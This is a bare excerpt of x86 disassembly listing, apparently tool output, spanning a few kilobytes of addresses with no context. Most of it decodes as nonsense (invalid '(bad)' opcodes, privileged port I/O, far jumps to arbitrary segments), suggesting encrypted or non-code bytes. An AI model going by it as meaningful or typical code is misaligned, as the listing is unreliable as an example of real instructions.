  404954:	stos   BYTE PTR es:[edi],al
  404955:	adc    eax,0x6d91b65a
  40495a:	cli    
  40495b:	fidiv  WORD PTR [ebx-0x58]
  40495e:	out    dx,al
  40495f:	add    eax,0x52f880be
  404964:	les    ebp,FWORD PTR ds:0x17721c5a
  40496a:	daa    
  40496b:	jb     0x404956
  40496d:	in     al,0x82
  40496f:	lods   al,BYTE PTR ds:[esi]
  404970:	mov    dl,BYTE PTR [edx+0x4a]
  404973:	lods   al,BYTE PTR ds:[esi]
  404974:	lods   al,BYTE PTR ds:[esi]
  404975:	stos   BYTE PTR es:[edi],al
  404976:	(bad)  
  404977:	pop    edi
  404978:	test   eax,0x2dc6b8ed
  40497d:	das    
  40497e:	sbb    BYTE PTR [eax-0x7d462c7e],0xf0
  404985:	scas   eax,DWORD PTR es:[edi]
  404986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404987:	mov    ch,0x55
  404989:	aas    
  40498a:	hlt    
  40498b:	pop    esi
  40498c:	inc    ecx
  40498d:	inc    ecx
  40498e:	jae    0x4049c0
  404990:	pop    ecx
  404991:	jmp    0x4049e8
  404993:	jns    0x4049b9
  404995:	aad    0xf5
  404997:	fs out 0x6a,eax
  40499a:	test   eax,0x301db1f5
  40499f:	mov    esp,0x532339e4
  4049a4:	in     eax,dx
  4049a5:	push   esp
  4049a6:	scas   eax,DWORD PTR es:[edi]
  4049a7:	xchg   esp,eax
  4049a8:	fwait
  4049a9:	dec    esp
  4049aa:	stos   DWORD PTR es:[edi],eax
  4049ab:	mov    edx,gs
  4049ad:	int    0xc1
  4049af:	and    al,BYTE PTR fs:[esi+edi*2-0x70]
  4049b4:	xchg   DWORD PTR [ebx+ecx*2],ebp
  4049b7:	push   ebp
  4049b8:	test   al,0xc
  4049ba:	mov    dh,0xdf
  4049bc:	rcl    edx,cl
  4049be:	dec    edx
  4049bf:	imul   ecx,DWORD PTR [eax-0x291f5368],0x9ff862e2
  4049c9:	bound  edi,QWORD PTR [ebx+0x2c8b568f]
  4049cf:	add    eax,0x8dffabfa
  4049d4:	push   0xbd6336fe
  4049d9:	shl    DWORD PTR [esi+0x76],0xcc
  4049dd:	sub    edi,0xb9e264ce
  4049e3:	add    al,0xdb
  4049e5:	or     al,0x93
  4049e7:	inc    edi
  4049e8:	test   BYTE PTR [ebx-0x76],bh
  4049eb:	jb     0x404a2d
  4049ed:	addr16 cld 
  4049ef:	retf   
  4049f0:	sbb    BYTE PTR [edi+0xd],0x15
  4049f4:	sahf   
  4049f5:	sbb    al,0x33
  4049f7:	adc    eax,0x96ebb33
  4049fc:	popa   
  4049fd:	pushf  
  4049fe:	jbe    0x404983
  404a00:	popf   
  404a01:	rol    ebx,0x62
  404a04:	xchg   ebp,eax
  404a05:	ret    
  404a06:	sahf   
  404a07:	pop    esi
  404a08:	sub    esi,DWORD PTR [edx-0x14]
  404a0b:	aam    0xa3
  404a0d:	mov    edx,DWORD PTR [edi-0x38e7543c]
  404a13:	jnp    0x404a1d
  404a15:	daa    
  404a16:	lea    esp,[ebp-0x105b9541]
  404a1c:	pusha  
  404a1d:	adc    BYTE PTR [edx-0x1d],cl
  404a20:	test   DWORD PTR [esi+0x40211a09],esi
  404a26:	arpl   WORD PTR [eax],si
  404a28:	adc    DWORD PTR [edx+0x54a114e8],ecx
  404a2e:	loopne 0x404a8b
  404a30:	sbb    DWORD PTR [eax-0x7a07959f],0x8223917
  404a3a:	mov    ch,0xce
  404a3c:	call   FWORD PTR [edx-0x9949a8a]
  404a42:	sbb    ecx,DWORD PTR [edx]
  404a44:	fwait
  404a45:	call   0x83af3f33
  404a4a:	adc    al,0xff
  404a4c:	mov    ah,0xe2
  404a4e:	in     eax,dx
  404a4f:	cmp    eax,0xd2f00e4c
  404a55:	fadd   DWORD PTR [edx-0x4a]
  404a58:	mov    ebx,0x7fc11b35
  404a5d:	push   ebx
  404a5e:	mov    ch,0x65
  404a60:	ja     0x404a1c
  404a62:	push   ebp
  404a63:	xor    ebx,DWORD PTR [ebp+0x680c1a3c]
  404a69:	stos   BYTE PTR es:[edi],al
  404a6a:	jnp    0x404aa8
  404a6c:	pop    eax
  404a6d:	retf   0x88b1
  404a70:	mov    al,ds:0xec688e8d
  404a75:	fst    DWORD PTR [edx-0x6b6e7051]
  404a7b:	pop    ds
  404a7c:	ss scas al,BYTE PTR es:[edi]
  404a7e:	dec    edi
  404a7f:	jbe    0x404aed
  404a81:	push   edx
  404a82:	iret   
  404a83:	adc    eax,0x904fbb28
  404a88:	adc    ch,bl
  404a8a:	daa    
  404a8b:	rol    BYTE PTR [ebx-0x49],1
  404a8e:	rol    BYTE PTR [ebp-0x6],1
  404a91:	cmp    eax,0xb475ea8e
  404a96:	dec    ebp
  404a97:	xor    eax,0x9f70720e
  404a9c:	enter  0xcec1,0x31
  404aa0:	(bad)  [ebx+0x41]
  404aa3:	test   al,0xaf
  404aa5:	and    eax,0xd8172b3f
  404aaa:	adc    al,0xe1
  404aac:	push   esp
  404aad:	ds int3 
  404aaf:	loopne 0x404af4
  404ab1:	lock lods eax,DWORD PTR ds:[esi]
  404ab3:	icebp  
  404ab4:	mov    bl,0xcb
  404ab6:	sbb    cl,dl
  404ab8:	xor    dh,BYTE PTR [eax]
  404aba:	retf   0xc95
  404abd:	outs   dx,BYTE PTR ds:[esi]
  404abe:	cwde   
  404abf:	xchg   edi,eax
  404ac0:	jb     0x404b0f
  404ac2:	pushf  
  404ac3:	inc    edx
  404ac4:	mov    eax,ds:0x4c7f348
  404ac9:	(bad)  
  404aca:	sbb    BYTE PTR [ebp+0xd],dl
  404acd:	fs xchg edi,eax
  404acf:	jb     0x404b1e
  404ad1:	jg     0x404afc
  404ad3:	in     eax,dx
  404ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad5:	push   es
  404ad6:	xchg   ecx,eax
  404ad7:	mov    DWORD PTR [edx+ecx*1-0x1af38a70],ebp
  404ade:	pop    esp
  404adf:	cmp    ch,BYTE PTR [ebx-0x46]
  404ae2:	ret    0xa67e
  404ae5:	push   edi
  404ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ae7:	jg     0x404b5f
  404ae9:	or     ecx,eax
  404aeb:	sti    
  404aec:	or     bh,BYTE PTR [ebx]
  404aee:	xor    al,0xff
  404af0:	push   cs
  404af1:	(bad)  
  404af2:	test   al,0xa1
  404af4:	inc    eax
  404af5:	stos   BYTE PTR es:[edi],al
  404af6:	(bad)  
  404af7:	out    dx,al
  404af8:	pop    esi
  404af9:	xchg   DWORD PTR [edx+0x72],esp
  404afc:	rcr    BYTE PTR [esi-0x57],0xa
  404b00:	and    edx,0x7309a7b
  404b06:	xchg   esi,eax
  404b07:	sbb    BYTE PTR [ecx],ch
  404b09:	in     al,dx
  404b0a:	imul   ecx,ebx,0xb5a0fc7d
  404b10:	and    eax,0xb180d61d
  404b15:	arpl   WORD PTR [edi-0x5c501997],cx
  404b1b:	mov    ds,WORD PTR [ebp+0x4eac477f]
  404b21:	shr    DWORD PTR [ebx],0xb8
  404b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b25:	and    edi,edi
  404b27:	ja     0x404aad
  404b29:	scas   al,BYTE PTR es:[edi]
  404b2a:	outs   dx,DWORD PTR ds:[esi]
  404b2b:	lods   al,BYTE PTR ds:[esi]
  404b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b2d:	test   BYTE PTR [ebp+0xb9ed0c4],ah
  404b33:	dec    eax
  404b34:	push   ebx
  404b35:	fisubr WORD PTR [eax]
  404b37:	sub    ebx,DWORD PTR [ecx]
  404b39:	or     al,0x83
  404b3b:	mov    cl,0x87
  404b3d:	mov    WORD PTR [ecx+0x1fd9d1d0],ss
  404b43:	mov    ecx,0xd4df5aa
  404b48:	push   edi
  404b49:	ss xchg DWORD PTR gs:[eax+edi*1+0x262a5908],edi
  404b52:	mov    al,0x91
  404b54:	sub    al,0x9f
  404b56:	dec    ebp
  404b57:	in     al,0xc7
  404b59:	gs pop ss
  404b5b:	cmp    DWORD PTR [esi],ebx
  404b5d:	xor    DWORD PTR [ebx],edx
  404b5f:	imul   edx,esp,0x12893eed
  404b65:	(bad)  
  404b66:	js     0x404ba0
  404b68:	push   edx
  404b69:	inc    edx
  404b6a:	jl     0x404b83
  404b6c:	in     eax,dx
  404b6d:	fwait
  404b6e:	inc    edx
  404b6f:	mov    edi,0x7bb06684
  404b74:	push   edx
  404b75:	sub    eax,0xd8700316
  404b7a:	sbb    edi,DWORD PTR [edi]
  404b7c:	adc    al,0x83
  404b7e:	in     eax,dx
  404b7f:	dec    ebx
  404b80:	sbb    eax,edx
  404b82:	icebp  
  404b83:	stos   DWORD PTR es:[edi],eax
  404b84:	in     al,dx
  404b85:	add    DWORD PTR [eax-0x37dc5025],0xd137bf1f
  404b8f:	stos   DWORD PTR es:[edi],eax
  404b90:	out    dx,al
  404b91:	mov    eax,ds:0x1fee8a72
  404b96:	int    0x15
  404b98:	add    eax,0x7ac3f8c3
  404b9d:	dec    ebx
  404b9e:	rol    bl,0xe0
  404ba1:	(bad)  
  404ba2:	jmp    0xfd45:0x2fd724e2
  404ba9:	mov    BYTE PTR [ebx+esi*2+0x60],ch
  404bad:	js     0x404b3e
  404baf:	mov    ebp,0x579b0765
  404bb4:	xchg   ecx,eax
  404bb5:	cmp    eax,0xa3f423f5
  404bba:	dec    edi
  404bbb:	pop    ss
  404bbc:	jp     0x404b67
  404bbe:	iret   
  404bbf:	in     eax,dx
  404bc0:	call   0x3b77:0x2c92be46
  404bc7:	call   0x6448:0xb2658625
  404bce:	outs   dx,BYTE PTR ds:[esi]
  404bcf:	daa    
  404bd0:	xchg   edx,eax
  404bd1:	aaa    
  404bd2:	pop    edx
  404bd3:	sub    al,BYTE PTR [edi-0xf9a2158]
  404bd9:	test   DWORD PTR [eax-0x4b],0x22799d6d
  404be0:	push   ecx
  404be1:	in     eax,0xdd
  404be3:	jnp    0x404bee
  404be5:	cli    
  404be6:	ficomp DWORD PTR [edi+0x258fca75]
  404bec:	mov    al,0x66
  404bee:	inc    esi
  404bef:	xchg   edx,eax
  404bf0:	aas    
  404bf1:	mov    eax,0xd419a6d7
  404bf6:	fdivr  DWORD PTR [ebp+0x2bfbe8e]
  404bfc:	add    DWORD PTR [ebx+0x29],0xffffffff
  404c00:	sbb    eax,0x1df7b508
  404c05:	outs   dx,DWORD PTR fs:[esi]
  404c07:	jg     0x404bae
  404c09:	aad    0x16
  404c0b:	adc    cl,BYTE PTR [edx-0x59]
  404c0e:	sbb    BYTE PTR [esi-0x6c],cl
  404c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c12:	mov    dh,0x4c
  404c14:	leave  
  404c15:	push   esp
  404c16:	arpl   WORD PTR [ebx+0x4af3fb4a],sp
  404c1c:	js     0x404c7a
  404c1e:	ffree  st(0)
  404c20:	popa   
  404c21:	jne    0x404c07
  404c23:	add    BYTE PTR [edx-0x2824325e],0x49
  404c2a:	int    0x9c
  404c2c:	scas   al,BYTE PTR es:[edi]
  404c2d:	icebp  
  404c2e:	sub    BYTE PTR [edi+0x9],ah
  404c31:	out    0xd,al
  404c33:	adc    ebp,DWORD PTR [edx+0x26]
  404c36:	mov    esp,0x55c45247
  404c3b:	jb     0x404c48
  404c3d:	std    
  404c3e:	dec    ebp
  404c3f:	lock push ecx
  404c41:	mov    eax,0xf488a464
  404c46:	pushf  
  404c47:	jns    0x404bed
  404c49:	nop
  404c4a:	xchg   edi,eax
  404c4b:	hlt    
  404c4c:	fcmovb st,st(2)
  404c4e:	(bad)  
  404c4f:	pop    ebp
  404c50:	inc    ebx
  404c51:	aad    0xe4
  404c53:	and    BYTE PTR gs:[esi],cl
  404c56:	mov    DWORD PTR [esi-0x3c2a0119],ebx
  404c5c:	fild   QWORD PTR [edi+esi*1-0x63e63e68]
  404c63:	mov    DWORD PTR [edx+edi*8],ebx
  404c66:	call   0x5517d71e
  404c6b:	pop    edi
  404c6c:	xor    BYTE PTR [eax],0xa3
  404c6f:	xchg   edi,eax
  404c70:	into   
  404c71:	popf   
  404c72:	pop    es
  404c73:	stc    
  404c74:	inc    ebp
  404c75:	lahf   
  404c76:	push   ecx
  404c77:	push   0xffffffe4
  404c79:	adc    BYTE PTR [edx+0x43ca0bea],0x90
  404c80:	or     eax,DWORD PTR [edx+0x30105461]
  404c86:	pusha  
  404c87:	push   ebp
  404c88:	fsub   QWORD PTR [esi+0x412ce35d]
  404c8e:	push   ecx
  404c8f:	mov    ds:0xa2c417d7,al
  404c94:	inc    ebp
  404c95:	adc    DWORD PTR [esp+ecx*4],eax
  404c98:	out    dx,eax
  404c99:	add    ebx,ebx
  404c9b:	(bad)  
  404c9c:	push   cs
  404c9d:	jmp    0x971e:0xb9af0ca8
  404ca4:	inc    esi
  404ca5:	test   eax,0xc35b025d
  404caa:	push   ss
  404cab:	push   ss
  404cac:	mov    ds:0x3d7ac73f,al
  404cb1:	lds    ebx,FWORD PTR [ebp-0x164d1059]
  404cb7:	inc    ebx
  404cb8:	adc    DWORD PTR [ecx-0x6daa8551],0xffffffac
  404cbf:	sub    al,0xd6
  404cc1:	cmp    DWORD PTR [esi],esi
  404cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cc4:	dec    ecx
  404cc5:	test   al,0xaf
  404cc7:	pop    es
  404cc8:	mov    edi,0x85de2ff0
  404ccd:	mov    al,0x69
  404ccf:	push   0x28
  404cd1:	out    0xbc,al
  404cd3:	xor    DWORD PTR [ecx-0x50],edx
  404cd6:	outs   dx,DWORD PTR ds:[esi]
  404cd7:	inc    ecx
  404cd8:	out    dx,eax
  404cd9:	xchg   edx,eax
  404cda:	xchg   ebp,eax
  404cdb:	popf   
  404cdc:	out    0xf6,eax
  404cde:	ja     0x404cfd
  404ce0:	pop    esi
  404ce1:	in     eax,dx
  404ce2:	and    eax,0x5389dba6
  404ce7:	pop    eax
  404ce8:	adc    eax,0x326bc708
  404ced:	push   ecx
  404cee:	add    al,0x64
  404cf0:	jo     0x404d5c
  404cf2:	xor    cl,ch
  404cf4:	sar    BYTE PTR [ecx-0x34495524],0xe4
  404cfb:	nop
  404cfc:	cmp    cl,ah
  404cfe:	mov    eax,ds:0x625be030
  404d03:	jl     0x404d18
  404d05:	(bad)
  404d08:	xchg   esi,eax
  404d09:	jae    0x404d5b
  404d0b:	sub    edi,DWORD PTR [esi*2-0x471aa0c7]
  404d12:	stos   BYTE PTR es:[edi],al
  404d13:	ja     0x404ce2
  404d15:	push   ds
  404d16:	data16 (bad) 
  404d18:	dec    ebp
  404d19:	mov    bh,0x74
  404d1b:	xchg   edi,eax
  404d1c:	repnz sub ebx,esp
  404d1f:	js     0x404d7f
  404d21:	dec    esi
  404d22:	jge    0x404d87
  404d24:	shl    dl,0xa4
  404d27:	or     ebx,DWORD PTR [edi+0x7802bd89]
  404d2d:	test   DWORD PTR [edx-0x78bb91d5],esp
  404d33:	int    0x2f
  404d35:	sub    BYTE PTR [ebp+0x759249f7],al
  404d3b:	nop
  404d3c:	lds    edx,FWORD PTR [ecx+0x28d80144]
  404d42:	cmp    edx,DWORD PTR [ecx]
  404d44:	test   al,0xc6
  404d46:	add    DWORD PTR [ecx+0x58d1e19],edx
  404d4c:	rol    BYTE PTR ds:0xa1f4dd3e,1
  404d52:	(bad)  
  404d53:	int3   
  404d54:	pop    ecx
  404d55:	jo     0x404d7d
  404d57:	cmp    eax,0xfe5f8448
  404d5c:	hlt    
  404d5d:	lds    edx,FWORD PTR [edx]
  404d5f:	dec    edi
  404d60:	popa   
  404d61:	addr16 jle 0x404dda
  404d64:	xchg   ebp,eax
  404d65:	or     BYTE PTR [ebx],bl
  404d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d68:	jne    0x404d0a
  404d6a:	jecxz  0x404d56
  404d6c:	mov    ebx,0x76d70dc4
  404d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d72:	in     eax,dx
  404d73:	xlat   BYTE PTR ds:[ebx]
  404d74:	mov    eax,edi
  404d76:	jnp    0x404d68
  404d78:	sub    BYTE PTR [ebx],bh
  404d7a:	cdq    
  404d7b:	in     al,0xc8
  404d7d:	sub    DWORD PTR [eax-0x75cb0a5],edx
  404d83:	jle    0x404d05
  404d85:	xor    al,0x8f
  404d87:	ret    
  404d88:	lahf   
  404d89:	mov    edx,0xc21478f6
  404d8e:	xchg   edi,eax
  404d8f:	popf   
  404d90:	aam    0x60
  404d92:	lock je 0x404dc2
  404d95:	jmp    0x404d27
  404d97:	lods   eax,DWORD PTR ds:[esi]
  404d98:	outs   dx,BYTE PTR ds:[esi]
  404d99:	inc    ecx
  404d9a:	add    DWORD PTR [ebx],edx
  404d9c:	push   edx
  404d9d:	lods   al,BYTE PTR ds:[esi]
  404d9e:	sub    ebx,ebp
  404da0:	or     eax,0x96a7b43b
  404da5:	dec    edx
  404da6:	jne    0x404d40
  404da8:	and    esi,esi
  404daa:	imul   ecx,DWORD PTR [edi+0x503c7947],0x7487aa48
  404db4:	mov    eax,ds:0x1b083817
  404db9:	data16 into 
  404dbb:	adc    al,0x8e
  404dbd:	xchg   DWORD PTR [edi],edi
  404dbf:	jo     0x404dbf
  404dc1:	call   FWORD PTR [edi+ebp*4]
  404dc4:	jg     0x404e01
  404dc6:	dec    ebx
  404dc7:	hlt    
  404dc8:	pop    edi
  404dc9:	mov    esi,0x269a4d67
  404dce:	mov    ebp,esp
  404dd0:	daa    
  404dd1:	xor    BYTE PTR [ebx-0x2b9bd9c6],dh
  404dd7:	add    DWORD PTR [ebp+0x4392fe01],eax
  404ddd:	inc    eax
  404dde:	pushf  
  404ddf:	out    dx,eax
  404de0:	jp     0x404dcd
  404de2:	and    bl,ch
  404de4:	adc    eax,0xe2757947
  404de9:	es sub eax,0x1013f271
  404def:	xchg   esi,eax
  404df0:	lds    ecx,FWORD PTR [edx]
  404df2:	pushf  
  404df3:	xchg   esp,eax
  404df4:	imul   edi,esi,0xffb81396
  404dfa:	stc    
  404dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dfc:	xchg   esp,eax
  404dfd:	dec    esp
  404dfe:	cmp    ch,al
  404e00:	arpl   WORD PTR [edx],si
  404e02:	neg    BYTE PTR [edi-0x7142b027]
  404e08:	inc    esi
  404e09:	leave  
  404e0a:	loop   0x404e1b
  404e0c:	push   edi
  404e0d:	or     BYTE PTR [edi-0x71a9bace],al
  404e13:	popf   
  404e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e15:	retf   
  404e16:	dec    ecx
  404e17:	adc    BYTE PTR [esi-0x76],bh
  404e1a:	rol    DWORD PTR [ebp-0x5d4ae58],0xe8
  404e21:	test   DWORD PTR [ebp+0x4a47a3c3],ebx
  404e27:	nop    esi
  404e2a:	xchg   BYTE PTR cs:[edx+0x18],dh
  404e2e:	es enter 0xde1e,0xeb
  404e33:	sub    ah,BYTE PTR [ebx+0x4cabb33]
  404e39:	mov    esp,0x7c440627
  404e3e:	nop
  404e3f:	icebp  
  404e40:	add    DWORD PTR [ebp+0xed7a949],0xd0795ea1
  404e4a:	aam    0xc8
  404e4c:	fnstenv [eax-0x19]
  404e4f:	sbb    eax,0x3907f3b9
  404e54:	mov    ebx,0xf77a4589
  404e59:	pusha  
  404e5a:	mov    esi,0xf87d8402
  404e5f:	fld    DWORD PTR [ebp-0x1a]
  404e62:	jp     0x404e7c
  404e64:	pop    es
  404e65:	mov    ebp,0xdb54611a
  404e6a:	pop    edi
  404e6b:	cwde   
  404e6c:	xchg   edx,eax
  404e6d:	xchg   esi,eax
  404e6e:	add    bh,BYTE PTR [ebx+0x239bb12c]
  404e74:	imul   ebx,DWORD PTR [ebx-0x5021ed24],0xffffffc4
  404e7b:	dec    ebx
  404e7c:	xchg   ecx,eax
  404e7d:	scas   eax,DWORD PTR es:[edi]
  404e7e:	aaa    
  404e7f:	inc    esi
  404e80:	push   0xffffff92
  404e82:	xchg   edx,eax
  404e83:	sbb    DWORD PTR [edx-0x42],ecx
  404e86:	add    al,0x39
  404e88:	push   0xf2295df1
  404e8d:	scas   eax,DWORD PTR es:[edi]
  404e8e:	sbb    eax,0x637562f2
  404e93:	mov    cl,0x87
  404e95:	adc    BYTE PTR [edx],ch
  404e97:	pusha  
  404e98:	je     0x404ec5
  404e9a:	popf   
  404e9b:	leave  
  404e9c:	sub    ebx,DWORD PTR [ebx]
  404e9e:	cmp    BYTE PTR [ecx],bl
  404ea0:	push   esp
  404ea1:	ds cmc 
  404ea3:	mov    edi,0xc274f7c5
  404ea8:	adc    DWORD PTR [edx-0x111ef9d],0x15
  404eaf:	sbb    BYTE PTR [edx-0x2b],dh
  404eb2:	scas   al,BYTE PTR es:[edi]
  404eb3:	xlat   BYTE PTR ds:[ebx]
  404eb4:	sar    BYTE PTR [esi-0x5c],cl
  404eb7:	inc    ebx
  404eb8:	imul   esi,DWORD PTR [edx+0x1029277b],0xffffffc0
  404ebf:	mov    cl,0x95
  404ec1:	mov    dh,0xa3
  404ec3:	xor    esi,DWORD PTR [edi]
  404ec5:	sbb    bl,0xbc
  404ec8:	dec    esp
  404ec9:	mov    edi,0x699da838
  404ece:	fsubrp st(7),st
  404ed0:	test   ebx,esp
  404ed2:	fisttp DWORD PTR [ecx+0x42e6d76c]
  404ed8:	xor    DWORD PTR [ecx],esi
  404eda:	jmp    0xee5f:0xd46a3f9e
  404ee1:	retf   0x9a65
  404ee4:	adc    al,0xe6
  404ee6:	mov    bl,0x31
  404ee8:	push   esi
  404ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eea:	and    al,0xcd
  404eec:	aas    
  404eed:	pop    es
  404eee:	loopne 0x404f04
  404ef0:	aas    
  404ef1:	mov    dl,0xec
  404ef3:	jge    0x404eb8
  404ef5:	fnstsw WORD PTR [ebx+eax*1]
  404ef8:	jg     0x404f79
  404efa:	cld    
  404efb:	imul   ebp,DWORD PTR [eax],0x750809a4
  404f01:	mov    ebx,0xf70a9cad
  404f06:	jne    0x404f5a
  404f08:	int3   
  404f09:	adc    BYTE PTR [esi],0xe3
  404f0c:	mov    fs,ebx
  404f0e:	push   edi
  404f0f:	add    DWORD PTR [ecx],ecx
  404f11:	aad    0xf
  404f13:	sbb    BYTE PTR [edi-0x4d151f0d],0xf1
  404f1a:	loopne 0x404eeb
  404f1c:	sub    BYTE PTR [esi],0x88
  404f1f:	ss pop ss
  404f21:	xchg   DWORD PTR ds:0xb5aee1ad,ecx
  404f27:	enter  0x5b0,0x36
  404f2b:	fisubr WORD PTR [edi-0x3577ec9c]
  404f31:	cdq    
  404f32:	ja     0x404f6a
  404f34:	or     al,0x99
  404f36:	je     0x404ecd
  404f38:	pop    edi
  404f39:	or     BYTE PTR [ecx-0x3b22c5ce],cl
  404f3f:	sbb    cl,BYTE PTR [ebp-0xc85f914]
  404f45:	sbb    al,0x44
  404f47:	ins    BYTE PTR es:[edi],dx
  404f48:	mov    ebx,0xd6802ec2
  404f4d:	xchg   ebp,eax
  404f4e:	push   0xef00a108
  404f53:	call   0x1102:0x2bc4ebff
  404f5a:	mov    ah,0xea
  404f5c:	(bad)  
  404f5d:	daa    
  404f5e:	dec    ecx
  404f5f:	outs   dx,DWORD PTR ds:[esi]
  404f60:	repnz in eax,dx
  404f62:	imul   edx,ebx,0xffffffb6
  404f65:	push   ss
  404f66:	enter  0x39af,0x3
  404f6a:	in     al,dx
  404f6b:	bound  eax,QWORD PTR [ecx]
  404f6d:	ror    eax,0xc3
  404f70:	cmp    edi,edi
  404f72:	ret    
  404f73:	mov    bl,0x62
  404f75:	mov    eax,0x29bf6c69
  404f7a:	lea    esp,[ebx-0x56]
  404f7d:	mov    eax,ds:0x3e286751
  404f82:	aas    
  404f83:	adc    BYTE PTR [edi],dl
  404f85:	ja     0x404f8a
  404f87:	jb     0x404f8b
  404f89:	cmp    eax,0x3dfd363e
  404f8e:	inc    edi
  404f8f:	xor    eax,0xf2e9dde6
  404f94:	sub    al,0x2e
  404f96:	inc    edi
  404f97:	ins    BYTE PTR es:[edi],dx
  404f98:	sbb    ecx,DWORD PTR [ebx+0x2238c2fa]
  404f9e:	mov    ds:0x8f04c219,al
  404fa3:	(bad)  [ecx-0x64]
  404fa6:	jge    0x404fec
  404fa8:	retf   
  404fa9:	push   esp
  404faa:	out    0x66,al
  404fac:	sub    DWORD PTR [ecx+0x6556f859],ebx
  404fb2:	jecxz  0x404f7a
  404fb4:	lahf   
  404fb5:	xchg   DWORD PTR [ebp+0x1a632c92],eax
  404fbb:	clc    
  404fbc:	sub    eax,0xcfaa0290
  404fc1:	lds    eax,FWORD PTR [ebp-0xa]
  404fc4:	fld    QWORD PTR [ebp+0x5b]
  404fc7:	out    0xe3,al
  404fc9:	call   FWORD PTR [esi]
  404fcb:	or     eax,DWORD PTR [ebx+ebp*8]
  404fce:	mov    ah,0xd7
  404fd0:	loope  0x405001
  404fd2:	mov    eax,ss:0x510da692
  404fd8:	out    0xdb,eax
  404fda:	cwde   
  404fdb:	stos   DWORD PTR es:[edi],eax
  404fdc:	ja     0x404fc2
  404fde:	jae    0x404fb7
  404fe0:	popf   
  404fe1:	or     dl,dl
  404fe3:	jl     0x405044
  404fe5:	xchg   ebx,eax
  404fe6:	mov    edi,0xb831dc2b
  404feb:	mov    cl,al
  404fed:	imul   esi,DWORD PTR [ecx+ebp*8+0x26],0x2329a2a9
  404ff5:	inc    ecx
  404ff6:	jnp    0x404f8a
  404ff8:	repz scas al,BYTE PTR es:[edi]
  404ffa:	aaa    
  404ffb:	xchg   edx,esi
  404ffd:	cs push esp
  404fff:	sti    
  405000:	adc    ecx,DWORD PTR [edi]
  405002:	fsubr  DWORD PTR [edx]
  405004:	and    DWORD PTR [edi],0xd29067d2
  40500a:	loop   0x404f91
  40500c:	pop    ebx
  40500d:	mov    ds:0x3c5d172a,al
  405012:	ret    0x11b6
  405015:	(bad)  
  405016:	sbb    eax,0xc78c5ceb
  40501b:	nop
  40501c:	fnstcw WORD PTR fs:[esi]
  40501f:	inc    ebp
  405020:	retf   0x286c
  405023:	test   eax,0x25bcd068
  405028:	sbb    al,0x1c
  40502a:	mul    DWORD PTR [edx-0x5a]
  40502d:	cmp    DWORD PTR [edx-0x30],0x39
  405031:	xlat   BYTE PTR ds:[ebx]
  405032:	push   eax
  405033:	out    0x39,eax
  405035:	sti    
  405036:	(bad)  
  405037:	mov    edi,DWORD PTR [edi]
  405039:	mov    al,ds:0xacebd060
  40503e:	lds    ecx,FWORD PTR [ebx+0x71]
  405041:	jbe    0x40502f
  405043:	fcomp  QWORD PTR [ebx-0x34]
  405046:	je     0x405033
  405048:	loopne 0x405049
  40504a:	mov    WORD PTR [ebx+0x3c],ds
  40504d:	sub    esp,DWORD PTR [edi+0x498f6a7f]
  405053:	sub    DWORD PTR [eax+eax*8-0x67],ebp
  405057:	mov    esi,0xb3403afa
  40505c:	xchg   ebx,eax
  40505d:	mul    bl
  40505f:	mov    edi,0x8618dc6f
  405064:	cdq    
  405065:	mov    edi,eax
  405067:	adc    BYTE PTR [edx],0x5d
  40506a:	dec    ecx
  40506b:	jl     0x40501d
  40506d:	push   0x8651a61f
  405072:	inc    esi
  405073:	cmp    eax,0x439f4494
  405078:	and    DWORD PTR [esi],esp
  40507a:	cld    
  40507b:	fdivr  QWORD PTR [esi+0x57]
  40507e:	retf   0x5b4e
  405081:	inc    ecx
  405082:	adc    eax,0x515798a0
  405087:	jle    0x4050c6
  405089:	(bad)
  40508e:	ss jmp 0x4050b3
  405091:	or     esp,0xc442c426
  405097:	pop    ds
  405098:	push   cs
  405099:	lock sbb DWORD PTR [edi+eax*8],ebx
  40509d:	mov    dh,0x7f
  40509f:	xlat   BYTE PTR ds:[ebx]
  4050a0:	push   edi
  4050a1:	mov    ?,WORD PTR [ecx-0x53]
  4050a4:	outs   dx,BYTE PTR ds:[esi]
  4050a5:	pop    esi
  4050a6:	adc    ah,ah
  4050a8:	mov    ?,eax
  4050aa:	xchg   edi,eax
  4050ab:	repz in eax,0xc7
  4050ae:	and    BYTE PTR [edi+ebx*1-0x5054db63],al
  4050b5:	fs jmp 0x8fa2:0x6e6f8812
  4050bd:	or     edi,DWORD PTR [ebp+0x74c511f]
  4050c3:	or     al,0xd5
  4050c5:	in     al,0x5d
  4050c7:	lods   eax,DWORD PTR ds:[esi]
  4050c8:	fistp  QWORD PTR [ebp+0x67]
  4050cb:	xor    eax,0x555b41cc
  4050d0:	icebp  
  4050d1:	jae    0x405059
  4050d3:	dec    ebx
  4050d4:	xchg   esi,eax
  4050d5:	adc    bh,BYTE PTR [edx-0x1e0c1cf7]
  4050db:	sar    dh,cl
  4050dd:	push   ecx
  4050de:	push   ss
  4050df:	in     eax,dx
  4050e0:	icebp  
  4050e1:	ds mov ah,0x62
  4050e4:	std    
  4050e5:	daa    
  4050e6:	mov    dh,0x2e
  4050e8:	dec    edi
  4050e9:	fimul  WORD PTR [ebx+ebp*2+0x46]
  4050ed:	xor    esp,DWORD PTR [ebx]
  4050ef:	shr    DWORD PTR [esp+edi*8],0x3e
  4050f3:	mov    edi,0x96372338
  4050f8:	dec    eax
  4050f9:	pop    es
  4050fa:	(bad)  
  4050fb:	rcr    DWORD PTR [eax-0x10],0x2
  4050ff:	pusha  
  405100:	dec    esi
  405101:	(bad)  
  405102:	sbb    eax,0xf6dfa0dc
  405107:	retf   0xbec
  40510a:	(bad)  
  40510c:	xchg   edi,eax
  40510d:	enter  0x9f4a,0xe7
  405111:	and    DWORD PTR [ecx+eax*8+0xd],0x1f
  405116:	in     al,0xd2
  405118:	sub    BYTE PTR [esi],ch
